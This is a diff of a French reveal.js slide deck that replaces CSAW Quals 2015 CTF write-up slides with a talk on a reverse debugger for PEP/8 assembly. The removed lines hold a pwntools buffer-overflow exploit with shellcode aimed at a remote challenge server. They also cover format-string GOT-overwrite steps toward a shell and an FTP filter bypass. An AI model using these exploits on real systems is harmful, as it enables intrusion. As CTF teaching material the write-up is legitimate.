@@ -42,672 +42,125 @@
 			<!-- Any section element inside of this container is displayed as a slide -->
 			<div class="slides">
 				<section>
-					<h1>CSAW-Quals 2015</h1>
-				</section>
+					<h2>Rétro-déboggueur pour PEP/8 avec support de code mutant</h2>
+                    <br>
 
-				<section>
-          <h1>Forensics 100</h1>
-					<h2>Keep Calm and CTF</h2>
-				</section>
+                    <br>
 
-        <section>
-          <img data-src="img/KCACTF.jpg">
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ``` bash
-                $ strings ./img.jpg | less
-
-                JFIF
-                XExif
-                h1d1ng_in_4lm0st_pla1n_sigh7
-                $3br
-                %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-                #3R
-                &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-                #N%%
-                ]<5)}
-                xdF_
-                MYUnb_
-            ```
-            </script>
-				</section>
-
-				<section>
-          <h1>Forensics 100</h1>
-					<h2>Flash</h2>
+					<h6>Présenté par :</h6> 
+                    <h6>Philippe Pépos Petitclerc</h6>
+                    <h6>Frédéric Vachon</h6>
 				</section>
 
 				<section data-markdown>
-            <script type="text/template">
-            ``` bash
-                $ file flash.img
-                flash.img: DOS/MBR boot sector
+                ### Plan de la présentation
 
-                $ ls -al flash.img
-                -rw-rw-r-- 1 fred fred 128M Sep 18 23:53 flash.img
-
-                $ strings flash.img | wc -w
-                9872470
-            ```
-
-            * Fichier de 128M
-            * Contient presque 10 millions de mots...
-            * Il faut raffiner la recherche
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ### On connaît le format du flag
-
-
-            ``` bash
-                $ strings flash.img | egrep flag{\\w*}
-                flag{b3l0w_th3_r4dar}
-            ```
-            </script>
-				</section>
-
-
-				<section>
-          <h1>Forensics 100</h1>
-					<h2>Transfer</h2>
+                * Littérature sur les techniques de rétro-déboguage
+                * PEP/8
+                * PEPdb
+                    * Assembleur/Désassembleur/Interpréteur
+                    * Rétro-déboguage
+                    * Support de code mutant
+                * Pseudo-démo
 				</section>
 
 				<section data-markdown>
-            <script type="text/template">
-            * Capture réseau (.pcap)
-            * Wireshark est notre ami
-            * Protocole HTTP: Reddit, Google, Facebook, Twitter...
-            * Pourquoi pas faire une recherche avec flag ?
-            * FollowTCPStream !!!
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Script de la capture réseau
-            
-            ``` python
-            FLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'
-            enc_ciphers = ['rot13', 'b64e', 'caesar']
-            # dec_ciphers = ['rot13', 'b64d', 'caesard']
-            
-            def encode(pt, cnt=50):
-                tmp = '2{}'.format(b64encode(pt))
-                for cnt in xrange(cnt):
-                    c = random.choice(enc_ciphers)
-                    i = enc_ciphers.index(c) + 1
-                    _tmp = globals()[c](tmp)
-                    tmp = '{}{}'.format(i, _tmp)
-
-                return tmp
-
-            if __name__ == '__main__':
-                print encode(FLAG, cnt=?)
-            ```
-            </script>
-        </section>
-
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Fonction pour décoder le flag
-            
-            ``` python
-            def decode(flag):
-                while flag[0] in ['1', '2', '3']:
-                    c = dec_ciphers[int(flag[0]) - 1]
-                    flag = globals()[c](flag[1:])
-                    
-                return flag
-
-            ```
-            ```
-            $ python ./decode_flag.py 
-            flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}
-            ```
-
-            </script>
-        </section>
-
-        <section>
-            <h1>Reverse 300</h1>
-            <h2>FTP</h2>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## À quoi on a affaire
-            ```
-            $ file ./ftp
-            ./ftp: ELF 64-bit LSB executable...dynamically linked...stripped
-            ```
-
-            ```
-            $ nc localhost 12012
-            Welcome to FTP server
-
-            HELP
-            USER PASS PASV PORT
-            NOOP REIN LIST SYST SIZE
-            RETR STOR PWD CWD
-
-            USER fred
-            Please send password for user fred
-
-            PASS fred
-            Invalid login credentials
-            ```
-
-
-            * Binaire GNU/Linux 64-bits
-            * Serveur FTP qui écoute sur le port 12012
-            * Objectif : S'authentifier
-
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Ce dont on a besoin
-
-            * Désassembleur et débogueur (radare2, gdb, IDA, etc.)
-            * Il faut communiquer par TCP (netcat)
-            * Idéalement, un minimum de compréhension de l'assembleur
-
-            </script>
-        </section>
-        
-				<section data-markdown>
-            <script type="text/template">
-            ## Reverse engineering
-
-            * L'utilisateur est hardcodé (blankwall)
-
-            ```
-            # Fonction de validation du mot de passe
-            key = 5381
-            for c in password:
-                key = password[i] + key * 33
-
-            if key == 3548828169:
-                print "[*] Logged in"
-            ```
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Reverse engineering
-
-            * Fonction inverse pour retrouver le mot de passe
-
-            ``` python
-            result_key = 5381
-            key = 3548828169
-            password = ""
-
-            while key != result_key:
-              for c in string.printable:
-                  if ((key - ord(c)) % 33) == 0:
-                      password += c
-                      key -= ord(c)
-                      key /= 33
-                      break
-
-            print password
-            ```
-            * Aucun résultats...
-            * Backtracking
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Reverse engineering
-
-            * Pas plus de résultats
-            * Retour dans le binaire
-            ``` nasm
-            cmp     eax, 0x0D386D209
-            ```
-            * Comparaison sur 32-bits 
-            * Integer overflow !
-            * Si les 32-bits de poids faible == 0x0D386D209 ça passe !
-
-            </script>
-        </section>
-
-				<section data-markdown>
-            <script type="text/template">
-            ## Reverse engineering
-
-            * Notre mot de passe : "Tje737"
-            * Le 'f' est filtré dans le path du fichier à télécharger
-            * Il y a une commande secrète (pas dévoilée par HELP) : RDF
-            * RDF nous envoie le flag
-
-            </script>
-
-				</section>
-
-				<section>
-          <h1>Exploit 100</h1>
-					<h2>Precision</h2>
+                ## Littérature
 				</section>
 
 				<section data-markdown>
-            <script type="text/template">
-            ## À quoi on a affaire
+                #### Efficient Algorithms for Bidirectional Debugging (2000)
 
-            ```
-            $ file ./precision 
-            ./precision: ELF 32-bit LSB executable...dynamically linked...not stripped
-            ```
-
-
-            ```
-            $ readelf --program-headers ./precision | grep -i stack
-            GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
-
-            $ ./precision 
-            Buff: 0xffe3f0f8
-            ```
-
-            * Binaire GNU/Linux 32-bits
-            * Bonne nouvelle: la stack est exécutable !
-            * Et on connaît l'adresse de notre buffer !
-            * Objectif : Avoir un shell sur la machine distante!
-
-            </script>
-        </section>
+                * Constat : un trap coûte environ un million de cycles processeur
+                * Ajout d'appel de fonctions avec compteurs
+                * Réexécution du programme, parfois plus d'une fois
+                * Capture d'états pour appels systèmes
+				</section>
 
 				<section data-markdown>
-            <script type="text/template">
-            ## Recherche de la faille
+                #### Instruction-level Execution for Debugging (2002)
 
-            ``` bash
-            $ python -c "print 'A'*10000" | ./precision
-            Buff: 0xffe51a28
-            Segmentation fault (core dumped)
-            $ strace -i ./precision < input_de_fou
-            [f7640b47] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xff968000} ---
-            ```
-
-            * SEGFAULT ! Devrait pas être trop difficile...
-            * Finalement, il y a un "canary" sur la stack
-            ``` nasm
-            fld    QWORD PTR [esp+0x98]
-            fld    QWORD PTR ds:0x8048690
-            fucomip st,st(1)
-            fstp   st(0)
-            je     0x80485c1 <main+164>
-            mov    DWORD PTR [esp],0x8048685
-            call   0x80483c0 <puts@plt>
-            mov    DWORD PTR [esp],0x1
-            call   0x80483e0 <exit@plt>
-            ```
-            
-            ``` bash
-            $ strace -i ./precision <input
-            [41414141] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
-            [????????????????] +++ killed by SIGSEGV (core dumped) +++
-            ```
-
-
-            </script>
-        </section>
+                * Construction du programme inverse
+                * Capture d'états uniquement pour les appels systèmes
+				</section>
 
 				<section data-markdown>
-            <script type="text/template">
-            ## Exploitation de la faille
+                #### An Efficient and Generic Reversible Debugger using the Virtual Machine based Approach (2005)
 
-            * Il faut avoir la valeur du canary à l'offset 128
-            * Le return address est à l'offset 148
-            * On met notre shellcode dans le buffer
-            * On écrase le return address par l'adresse du buffer
+                * Mode déboguage/Mode réel
+                * Capture d'états à interval de temps dynamiquement ajusté selon un surcoût toléré
+                * Retour à la capture la plus proche et réexécution
+				</section>
 
-            ```
-+-----------+
-| Saved EIP | offset 148
-+-----------+
-| ......... |
-+-----------+
-| Canary    | offset 128
-+-----------+
-| buffer    |
-+-----------+ 
-            ```
-            </script>
-        </section>
+                <section data-markdown>
+                ## PEP/8
+                </section>
 
 				<section data-markdown>
-            <script type="text/template">
-            ## Exploit
+                ### PEP/8
 
+                * Language d'assemblage éducatif
+                * 39 mnémoniques
+                * Seulement 4 instructions d'écriture en mémoire
+                ```nasm
+                 LDA     0,i
+                 LDBYTEA in,d        
+                 CPA     'd',i       
+                 BREQ    affiche     
+                 CPA     'q',i       
+                 BREQ    fin         
+                 CPA     '1',i       
+                 BRLT    loop        
+                 CPA     '7',i       
+                 BRLE    ifNumber
+                ```
+				</section>
 
-``` python
-from pwn import *
+                <section data-markdown>
+                ## PEPdb
+                </section>
 
-CANARY = '\xA5\x31\x5a\x47\x55\x15\x50\x40'
-LEN_EXPLOIT = 128
-shellcode = '\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'
+				<section data-markdown>
+                ### Composantes
 
-conn = remote('54.173.98.115', 1259)
-#conn = process('../precision')
-ret_addr = conn.recv().split(' ')[1]
-ret_addr = struct.pack('<I', int(ret_addr, 16))
+                * Assembleur
+                * Désassembleur
+                * Interpréteur
+                * Rétro-débogueur avec support de code mutant
+				</section>
 
-exploit = shellcode + 'A' * (LEN_EXPLOIT - len(shellcode)) \\
-          + CANARY + 'B' * 12 + ret_addr
+				<section data-markdown>
+                ### Rétro-débogueur
 
-conn.send_raw(exploit)
-conn.interactive()
+                * Capture de 3 types de log
+                * Instruction de base
+                    * Registres avant exécution
+                * Instruction avec modification de mémoire déterministe 
+                    * Registres avant exécution
+                    * Adresse affectée
+                    * Données avant
+                * Instruction avec modification de mémoire indéterministe
+                    * Registres avant exécution
+                    * Adresse affectée
+                    * Données avant
+                    * Données après
+				</section>
 
-            ```
-            </script>
-        </section>
+				<section data-markdown>
+                ### Rétro-débogueur
 
-		<section>
-            <h1>Exploit 250</h1>
-            <h2>Contacts</h2>
-        </section>
+                * Navigation à reculons en restaurant les états
+                * Réexécution des instructions
+                * Sauf pour écritures indéterministes
+				</section>
 
-        <section data-markdown>
-            <script type="text/template">
-            ## À quoi on a affaire
-            ```
-            $ file ./contacts
-            contacts: ELF 32-bit LSB executable...dynamically linked...stripped
-            ```
+				<section data-markdown>
+                ### Support de code mutant
 
-            ```
-            $ ./contacts 
-            Menu:
-            1)Create contact
-            2)Remove contact
-            3)Edit contact
-            4)Display contacts
-            5)Exit
-            >>> 
-            ```
-
-            * Binaire GNU/Linux 32-bits
-            * Gestionnaire de contact
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Mécanismes de protection
-
-            ```
-            $ readelf --program-headers ./contacts | grep GNU_STACK
-            GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
-            ```
-            * La stack n'est pas exécutable
-            * ASLR (Address Space Layout Randomization) est activé
-            * Les choses se corsent ...
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Recherche de la faille
-
-            * Essayer de faire planter le programme avec des entrées trop longues
-            * Tester pour format string (%x.%x.%x)
-            ```
-            Contacts:
-                Name: %x.%x.%x
-                Length 20
-                Phone #: %x.%x.%x
-                Description: 86d9008.f759c401.f76f3000
-            ```
-
-            * On a affaire à un format string attack
-            * Nooonnnnn !!!!!
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Format String Attack
-
-            * printf("%d %d\n", e1, e2);
-            * Et si on écrit : printf("%d %d") ?
-            * printf("aaa %n");
-            * Il y a faille si l'utilisateur contrôle le format
-            * Fonctions vulnérables : printf, fprintf, snprintf, etc.
-            * Toutes les fonctions qui prennent un format string en paramètre sont vulnérables
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Scénario d'attaque
-            
-            * On veut appeller system("/bin/sh");
-            * Il faut trouver une fonction à remplacer par system
-            * Il va falloir écraser la fonction dans la GOT
-            * Il va falloir lui passer "/bin/sh" en paramètre
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Global Offset Table (GOT)
-    
-            * Tableau de pointeurs vers des fonctions de bibliothèques externes
-            * Populé dynamiquement par le loader
-
-            ```
-            Relocation section '.rel.plt' at offset 0x43c contains 14 entries:
-             Offset     Info    Type            Sym.Value  Sym. Name
-            0804b00c  00000107 R_386_JUMP_SLOT   00000000   strcmp
-            0804b010  00000207 R_386_JUMP_SLOT   00000000   printf
-            0804b014  00000307 R_386_JUMP_SLOT   00000000   free
-            0804b018  00000407 R_386_JUMP_SLOT   00000000   fgets
-            0804b01c  00000507 R_386_JUMP_SLOT   00000000   __stack_chk_fail
-            0804b020  00000607 R_386_JUMP_SLOT   00000000   malloc
-            0804b024  00000707 R_386_JUMP_SLOT   00000000   puts
-            0804b028  00000807 R_386_JUMP_SLOT   00000000   __gmon_start__
-            0804b02c  00000907 R_386_JUMP_SLOT   00000000   exit
-            0804b030  00000a07 R_386_JUMP_SLOT   00000000   strchr
-            0804b034  00000b07 R_386_JUMP_SLOT   00000000   __libc_start_main
-            0804b038  00000c07 R_386_JUMP_SLOT   00000000   setvbuf
-            0804b03c  00000d07 R_386_JUMP_SLOT   00000000   memset
-            0804b040  00000e07 R_386_JUMP_SLOT   00000000   __isoc99_scanf
-            ```
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Format string
-    
-            * "memset" est appelé avec notre input quand on efface un contact
-            * C'est bien beau, mais c'est quoi l'adresse de system ?
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Libc
-    
-            * System est à un offset différent d'une libc à l'autre
-            * Quelle version exacte de la libc tourne sur le serveur ?
-            * Offset de system dans la libc en question
-            * Leaker une adresse de libc sur la stack et trouver l'offset de system par rapport à cette adresse
-            * On est finalement prêt à écrire notre exploit...
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Exploit
-
-            * Il nous faut 4 format string :
-                * écrire ptr_GOT
-                * écrire 2 bytes dans memset
-                * écrire ptr_GOT + 2
-                * écrire 2 bytes dans memset
-
-
-            ``` bash
-            #######################+-----------+
-             +-------------------> |   memset  |
-             |  +-----------+      +-----------+
-             +- | ptr_GOT   |<-+
-                +-----------+  |
-                | ......... |  |
-                +-----------+  |
-                | ptr_stack | -+
-                +-----------+
-                | printf    |
-                +-----------+ 
-            ```
-
-            </script>
-        </section>
-
-		<section>
-            <h1>Exploit 300</h1>
-            <h2>FTP</h2>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## FTP
-            
-            * C'est le même programme, mais maintenant il faut downloader flag.txt
-            * Il faut outrepasser le filtre du "f" dans le path du fichier
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Recherche de la faille
-            
-            * Essayer toutes les commandes avec un input très très long (python -c "print 'A'*100000")
-            * Le programme ne crash pas...
-            * La commande STOR nous permet d'uploader un fichier
-            * Oh ! Ça crash !
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Analyse du crash
-            
-            * Le programme a essayé d'écrire 0x0 à une adresse invalide
-``` asm
-0x401ee0:   mov    BYTE PTR [rax+0x604200],0x0
-```
-            * rax = len(data)
-            * On peut écrire 0 à n'importe quelle adresse > 0x604200
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Exploitation de la faille
-            * Et si remplaçait le filtre 'f' par 0x0
-
-            ```
-            mov    rax,QWORD PTR [rbp-0x30]
-            movzx  eax,BYTE PTR [rax]
-            movsx  edx,al
-            mov    eax,DWORD PTR [rip+0x202297]        # 0x604408
-            cmp    edx,eax
-            ```
-            * 0x604408 > 0x604200 : On peut remplacer le "f" par 0x0 !
-            * Il faut envoyer 520 bytes de données
-            </script>
-        </section>
-
-
-		<section>
-            <h1>Reverse 500</h1>
-            <h2>Wyvern</h2>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## À quoi on a affaire
-
-            
-            * Binaire 64-bits pour Linux
-            * Obfuscator-LLVM clang version 3.6.1
-            * C++
-
-``` bash
-$ ./wyvern 
-+-----------------------+
-|    Welcome Hero       |
-+-----------------------+
-
-[!] Quest: there is a dragon prowling the domain.
-    brute strength and magic is our only hope. Test your skill.
-
-Enter the dragon's secret: 
-AAAAAAAAAAAAAA
-
-[-] You have failed. The dragon's power, 
-speed and intelligence was greater.
-```
-            * Il faut trouver le secret du dragon
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Deobfusquer le binaire
-            
-
-
-            </script>
-        </section>
-
-        <section data-markdown>
-            <script type="text/template">
-            ## Foutre la raclée au dragon
-```            
-$ ./wyvern 
-+-----------------------+
-|    Welcome Hero       |
-+-----------------------+
-
-[!] Quest: there is a dragon prowling the domain.
-    brute strength and magic is our only hope. Test your skill.
-
-Enter the dragon's secret: dr4g0n_or_p4tric1an_it5_LLVM
-success
-
-[+] A great success! Here is a flag{dr4g0n_or_p4tric1an_it5_LLVM}
-```
-
-
-
-            </script>
-        </section>
-        <section>
-            <h1>Fin/Bénélux</h1>
-        </section>
+                * Objectif : Utiliser les informations du source autant que possible
+                * Comparaison de l'instruction du source avec l'instruction décodé en mémoire
+                * En cas de modification, on utilise le désassembleur
+				</section>
       
     </div>
 
